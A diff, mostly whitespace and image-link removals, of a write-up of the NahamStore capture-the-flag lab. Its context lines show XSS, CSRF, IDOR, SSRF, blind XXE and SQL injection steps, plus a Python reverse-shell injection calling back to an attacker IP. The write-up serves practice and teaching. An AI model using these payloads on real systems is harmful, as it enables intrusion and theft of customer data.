@@ -51,7 +51,6 @@ There are nice books to learn bug bounty
 https://github.com/m0chan/BugBounty/blob/master/Bug%20Bounty%20Playbook.pdf
 https://github.com/akr3ch/BugBountyBooks
 
-
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ tail /etc/hosts
 
@@ -191,9 +190,7 @@ Ip address      Code Subdomain                              Server              
                                  10.10.3.2            stock.nahamstore.thm                                                          something.nahamstore.thm
                                   10.10.3.2       200  www.nahamstore.thm                     nginx/1.14.0 (Ubuntu)                  something.nahamstore.thm
 
-
 Ip address: 1 | Subdomain: 4 | elapsed time: 00:10:38 
-
 
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ gau nahamstore.com
@@ -967,7 +964,6 @@ Target: http://nahamstore-2020-dev.nahamstore.thm/api/
 
 Task Completed
 
-
 I see it
 
 ┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
@@ -1027,7 +1023,6 @@ http__www_nahamstore_thm__da39a3ee5e6b4b0d.png
                                                                                   
 ┌──(witty㉿kali)-[~/bug_hunter/Endpoints/screenshots]
 └─$ eog http__nahamstore-2020-dev_nahamstore_thm__c6a7e330ca22983c.png
-
 
 customer_id is required
 
@@ -1107,7 +1102,6 @@ https://github.com/s0md3v/Arjun
 [*] Logicforcing the URL endpoint
 [✓] parameter detected: error, based on: body length
 [+] Parameters found: error
-
 
 http://marketing.nahamstore.thm/?error=Campaign+Not+Found
 
@@ -1305,7 +1299,6 @@ http://nahamstore.thm/search?q=%27%2Balert.call(null%2Cdocument.domain)%2B%27
 This is a nice tool :)
 
 or doing manually
-
 
 <script>
     var search = '';alert(document.domain)//';
@@ -1829,8 +1822,6 @@ Was really fun :)
 
 ```
 
-![[Pasted image 20230320164607.png]]
-
 Enter an URL ( including parameters ) of an endpoint that is vulnerable to XSS  
 
 	*http://marketing.nahamstore.thm/?error*
@@ -1922,7 +1913,6 @@ http://nahamstore.thm/login?redirect_url=https://www.google.com
 
 works (in order to work just need to enter first http://nahamstore.thm/login?redirect_url=https://www.google.com then fill in the fields then press register)
 
-
 ```
 
 Open Redirect One  
@@ -1942,18 +1932,15 @@ Answer the questions below
 ```
 First we need to sign in and look for change email or pass and see if there's a CRRF token
 
-
 http://nahamstore.thm/account/settings
 http://nahamstore.thm/account/settings/email
 Email Changed
-
 
 let's intercept with burp
 
 POST /account/settings/email HTTP/1.1
 
 Host: nahamstore.thm
-
 
 Upgrade-Insecure-Requests: 1
 
@@ -2073,7 +2060,6 @@ Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
 10.8.19.103 - - [21/Mar/2023 13:14:43] "GET / HTTP/1.1" 200 -
 10.8.19.103 - - [21/Mar/2023 13:14:47] "GET /CSRF_poc.html HTTP/1.1" 200 -
 
-
 Email Changed (We did it :)
 
 and we wanna connect it again cannot cz the email witty@gmail.com is now evil@gmail.com
@@ -2112,7 +2098,6 @@ Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
 10.8.19.103 - - [21/Mar/2023 16:25:31] "GET / HTTP/1.1" 200 -
 10.8.19.103 - - [21/Mar/2023 16:25:35] "GET /CSRF_poc.html HTTP/1.1" 200 -
 
-
 Now changing pass
 
 http://nahamstore.thm/account/settings/password
@@ -2143,7 +2128,6 @@ If u haven't burp pro u can use https://github.com/merttasci/csrf-poc-generator
   <script>document.forms[0].submit()</script>
 </html>
 
-
 let's test it
 
 ┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
@@ -2151,7 +2135,6 @@ let's test it
 Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
 10.8.19.103 - - [21/Mar/2023 16:42:27] "GET / HTTP/1.1" 200 -
 10.8.19.103 - - [21/Mar/2023 16:42:31] "GET /CSRF_poc_pass.html HTTP/1.1" 200 -
-
 
 Password has been updated
 
@@ -2173,15 +2156,7 @@ highlight it
 
 {"data":"{"user_id":4,"timestamp":"1679417578"}","signature":"28370d02bb38772d710f55886f9aa34aIn0
 
-
-
 ```
-
-![[Pasted image 20230321115915.png]]
-
-![[Pasted image 20230321121231.png]]
-
-![[Pasted image 20230321121531.png]]
 
 What URL has no CSRF protection  
 
@@ -2254,7 +2229,6 @@ address_id=1&card_no=1234123412341234
 Response
 HTTP/1.1 302 Found  (Follow redirection press)
 
-
 Shipping Address
 Mr Charles Cook
 4754 Swick Hill Street
@@ -2268,7 +2242,6 @@ User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102
 
 and the others
 
-
 Shipping Address
 Mrs Rita Miles
 3914 Charles Street
@@ -2279,7 +2252,6 @@ Order Details
 Order Id: 7
 Order Date: 21/03/2023 21:42:28
 User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
-
 
 Shipping Address
 Mr Jimmy Jones
@@ -2292,7 +2264,6 @@ Order Id: 8
 Order Date: 21/03/2023 21:42:37
 User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
 
-
 Shipping Address
 Mr Jimmy Jones
 160 Broadway
@@ -2302,7 +2273,6 @@ Order Details
 Order Id: 9
 Order Date: 21/03/2023 21:42:46
 User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
-
 
 Shipping Address
 Mr Charles Cook
@@ -2315,7 +2285,6 @@ Order Id: 10
 Order Date: 21/03/2023 21:42:54
 User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
 
-
 Shipping Address
 Mr h1hi h1hi
 h1hi
@@ -2325,7 +2294,6 @@ Order Details
 Order Id: 11
 Order Date: 21/03/2023 21:43:04
 User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
-
 
 Shipping Address
 Mrs Rita Miles
@@ -2370,7 +2338,6 @@ what=order&id=6&user_id=6
 
 after 4 and 5 which are my orders we can obtain other orders
 
-
 Product Cost
 Total $0.00
 1
@@ -2393,7 +2360,6 @@ what=order&id=§6§&user_id=§6§ (Using cluster bomb -- 2 payloads )
 I see it need to encode it like (ctrl + u)
 
 what=order&id=1%26user_id%3d1
-
 
 Product Cost
 Sticker Pack $15.00
@@ -2459,10 +2425,7 @@ Uhmm from our results we didn't find bypass even though there say bypassed
 Btw
 we also found at first task in another subdomain
 
-
 ```
-
-![[Pasted image 20230321183240.png]]
 
 First Line of Address  
 
@@ -2627,7 +2590,6 @@ product_id=2&server=stock.nahamstore.thm@stock.nahamstore.thm/product#
 
 {"items":[{"id":1,"name":"Hoodie + Tee","stock":56,"endpoint":"\/product\/1"},{"id":2,"name":"Sticker Pack","stock":293,"endpoint":"\/product\/2"}]}
 
-
 product_id=2&server=stock.nahamstore.thm@localhost
 
 NahamStore - 404 Page Not Found
@@ -2673,7 +2635,6 @@ after a long time
 2846:internal-api.staging
 2847:internal-api.test
 
-
 product_id=2&server=stock.nahamstore.thm@internal-api.nahamstore.thm#
 
 different length 346
@@ -2682,14 +2643,11 @@ Response:
 
 {"server":"internal-api.nahamstore.com","endpoints":["\/orders"]}
 
-
-
 product_id=2&server=stock.nahamstore.thm@internal-api.nahamstore.thm/orders#
 
 Response:
 
 [{"id":"4dbc51716426d49f524e10d4437a5f5a","endpoint":"\/orders\/4dbc51716426d49f524e10d4437a5f5a"},{"id":"5ae19241b4b55a360e677fdd9084c21c","endpoint":"\/orders\/5ae19241b4b55a360e677fdd9084c21c"},{"id":"70ac2193c8049fcea7101884fd4ef58e","endpoint":"\/orders\/70ac2193c8049fcea7101884fd4ef58e"}]
-
 
 product_id=2&server=stock.nahamstore.thm@internal-api.nahamstore.thm/orders/4dbc51716426d49f524e10d4437a5f5a#
 
@@ -2713,10 +2671,7 @@ product_id=2&server=stock.nahamstore.thm@internal-api.nahamstore.thm/orders/70ac
 
 {"id":"70ac2193c8049fcea7101884fd4ef58e","customer":{"id":3,"name":"Charles Cook","email":"maverick1974@hotmail.com","tel":"617-776-8871","address":{"line_1":"4754 Swick Hill Street","city":"Harahan","state":"Louisiana","zipcode":"70123"},"items":[{"name":"Sticker Pack","cost":"15.00"}],"payment":{"type":"Visa","number":"4539923410704592","expires":"12\/2023","CVV2":"715"}}}
 
-
 ```
-
-![[Pasted image 20230322180055.png]]
 
 Credit Card Number For Jimmy Jones
 
@@ -2745,7 +2700,6 @@ Let's use turbo intruder (Extensions send to turbo intruder)
 ┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
 └─$ more /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt | wc -l
 6453
-
 
 Here replace it
 
@@ -2776,7 +2730,6 @@ Connection: keep-alive
 
 send to repeater
 
-
 Request:
 POST /product/1?xml HTTP/1.1
 
@@ -2795,7 +2748,6 @@ Upgrade-Insecure-Requests: 1
 Content-Type: application/x-www-form-urlencoded
 
 Content-Length: 71
-
 
 <?xml version="1.0"?>
 
@@ -2898,7 +2850,6 @@ uploading xlsx (Excel)
 
 Structure of the XLSX:
 
-
 $ 7z l xxe.xlsx
 [...]
    Date      Time    Attr         Size   Compressed  Name
@@ -2915,15 +2866,12 @@ $ 7z l xxe.xlsx
 ------------------- ----- ------------ ------------  ------------------------
 2021-10-17 15:19:00              11216         3586  9 files
 
-
 Extract Excel file: `7z x -oXXE xxe.xlsx`
 
 Rebuild Excel file:
 
-
 $ cd XXE
 $ 7z u ../xxe.xlsx *
-
 
 Add your blind XXE payload inside `xl/workbook.xml`.
 
@@ -2947,9 +2895,7 @@ Using a remote DTD will save us the time to rebuild a document each time we want
 
 Serve DTD and receive FTP payload using [xxeserv](https://github.com/staaldraad/xxeserv):
 
-
 $ xxeserv -o files.log -p 2121 -w -wd public -wp 8000
-
 
 Let's follow the steps
 
@@ -3234,10 +3180,7 @@ PASS:  anonymous
 └─$ echo "e2Q2YjIyY2IzZTM3YmVmMzJkODAwMTA1YjExMTA3ZDhmfQo=" | base64 -d 
 {d6b22cb3e37bef32d800105b11107d8f}
 
-
 ```
-
-![[Pasted image 20230322192737.png]]
 
 XXE Flag  
 
@@ -3246,7 +3189,6 @@ XXE Flag
 Blind XXE Flag
 
 *{d6b22cb3e37bef32d800105b11107d8f}*
-
 
 ### RCE
 
@@ -3299,7 +3241,6 @@ what=order&id=4$(python3 -c 'import socket,subprocess,os;s=socket.socket(socket.
 another way
 
 what=order&id=4`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`
-
 
 ┌──(witty㉿kali)-[~/bug_hunter/xxeserv]
 └─$ rlwrap nc -lvnp 1338                                     
@@ -3545,7 +3486,6 @@ Like I thought we were in a docker container
 
 ```
 
-
 First RCE flag  
 
 *{b42d2f1ff39874d56132537be62cf9e3}*
@@ -3553,7 +3493,6 @@ First RCE flag
 Second RCE flag
 
 *{93125e2a845a38c3e1531f72c250e676}*
-
 
 ### SQL Injection
 
@@ -3982,14 +3921,11 @@ Table: sqli_one
 
 [*] ending @ 00:16:21 /2023-03-24/
 
-
 now finding another sqli
 
 -----------------------------146320265839157975802094687199
 
 Content-Disposition: form-data; name="order_number"
-
-
 
 1;SELECT SLEEP(5)#
 
@@ -3997,15 +3933,11 @@ Content-Disposition: form-data; name="order_number"
 
 Content-Disposition: form-data; name="return_reason"
 
-
-
 1
 
 -----------------------------146320265839157975802094687199
 
 Content-Disposition: form-data; name="return_info"
-
-
 
 1
 
@@ -4027,9 +3959,7 @@ Location: /returns/167?auth=5878a7ab84fb43402106c575658472fa
 
 Content-Length: 0
 
-
 after 5 seconds so is blind 
-
 
 ┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
 └─$ cat req_2               
@@ -4060,7 +3990,6 @@ Content-Disposition: form-data; name="return_info"
 
 1
 -----------------------------146320265839157975802094687199--
-
 
 ┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
 └─$ sqlmap -r req_2 --batch                                    
